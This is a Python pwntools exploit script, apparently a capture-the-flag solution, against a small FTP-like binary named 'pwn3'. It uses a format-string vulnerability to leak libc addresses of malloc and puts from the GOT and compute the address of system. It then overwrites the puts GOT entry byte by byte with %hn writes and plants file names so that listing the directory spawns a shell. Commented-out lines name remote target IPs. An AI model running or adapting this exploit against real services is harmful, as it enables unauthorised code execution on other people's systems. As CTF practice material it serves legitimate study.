# coding = utf8
from pwn import *
context.log_level = 'debug'


#R=remote('120.27.155.82',9000)
def init():
	p = process('./pwn3')
	# p = remote('115.28.35.168',10010)
	p.recvuntil(':')
	p.send('rxraclhm\n')
	return p  

# def setvalue(addr,value):
	# a=['i','n','/','s']
	# for i in range(0,4):
		# R.send('put\n')
		# R.recvuntil(':')
		# R.send(a[3-i]+'\n')
		# R.recvuntil(':')
		# R.send('%'+'%03d'%((value>>(8*i)&0xff)-2)+'x'+'  '+'%10$n'+p32(addr+i)+'\n')
		# R.recvuntil('>')
		# R.send('get\n')
		# R.recvuntil(':')
		# R.send(a[3-i]+'\n')
		# R.recvuntil('>')
		# i+=1
## firstly,init local process,after that we can init remote process.
p = init()
## we can leak the libc_address of malloc and puts,then we will get the version of the libc by http://libcdb.com/
## but before do it,we should get the got_address of malloc and puts,so that we can puts the libc_address of malloc and puts.
# so
pwn3_elf = ELF('./pwn3')
got_malloc = pwn3_elf.got['malloc']
got_puts = pwn3_elf.got['puts']

## then we put the addr into the  content, and leak its libc_address
# leak 1

# p.recvuntil('>')
# p.sendline('put')
# p.recvuntil(':')
# p.sendline('1')
# p.sendline(p32(got_malloc)+'%7$s...')
# p.recvuntil('>')
# p.sendline('get')
# p.recvuntil(':')
# p.sendline('1')
# libc_malloc =u32(p.recvuntil('...')[4:8])
# print 'libc_malloc='+hex(libc_malloc)

# leak 2

# p.recvuntil('>')
# p.sendline('put')
# p.recvuntil(':')
# p.sendline('2')
# p.sendline(p32(got_puts)+'%7$s...')
# p.recvuntil('>')
# p.sendline('get')
# p.recvuntil(':')
# p.sendline('2')
# libc_puts =u32(p.recvuntil('...')[4:8])
# print 'libc_puts='+hex(libc_puts)
### I can improve it.make it better
def putfile(name,content):
	p.recvuntil('>')
	p.sendline('put')
	p.recvuntil(':')
	p.sendline(name)
	p.recvuntil(':')
	p.sendline(content)
	return None
def getfile(name):
	p.recvuntil('>')
	p.sendline('get')
	p.recvuntil(':')
	p.sendline(name)
	return None #if ret,we will lose "ftp>"
def showfile():
	p.recvuntil('>')
	p.sendline('dir')
	return None
## get address of libc_malloc
putfile('a',p32(got_malloc)+'%7$s...')
getfile('a')
libc_malloc =u32(p.recvuntil('...')[4:8])
print 'libc_malloc='+hex(libc_malloc)
## get address of libc_puts
putfile('b',p32(got_puts)+'%7$s...')
getfile('b')
libc_puts =u32(p.recvuntil('...')[4:8])
print 'libc_puts='+hex(libc_puts)

## OH ho ~ now,we visit http://libcdb.com/ to get the version of the libc and get the system address

# malloc_offset = int(raw_input('malloc_offset:'),16)
# system_offset = int(raw_input('system_offset:'),16)
# malloc_offset = 0x000737c0
# system_offset = 0x0003bc00
libc_system = libc_malloc - 0xf765c8d0 + 0xf7623c30
# gdb.attach(pidof(p)[0])
# raw_input()
print 'libc_system='+hex(libc_system)

## when i do it ,the remote service is closed,so i hava to debug it in loacalhost.

## now we can use fmt to change puts() to system() in plt.
l1 = (libc_system >> (8 *0)) & 0xff
l2 = (libc_system >> (8 *1)) & 0xff
l3 = (libc_system >> (8 *2)) & 0xff
l4 = (libc_system >> (8 *3)) & 0xff

putfile(';',p32(got_puts)+'%%%dc'%(l1-4)+"%7$hn")
getfile(';')
putfile('h',p32(got_puts+1)+'%%%dc'%(l2-4)+"%7$hn")
getfile('h')
putfile('s',p32(got_puts+2)+'%%%dc'%(l3-4)+"%7$hn")
getfile('s')
putfile('/',p32(got_puts+3)+'%%%dc'%(l4-4)+"%7$hn")
getfile('/')
putfile('/bin','a')
# gdb.attach(pidof(p)[0])
showfile()
p.interactive()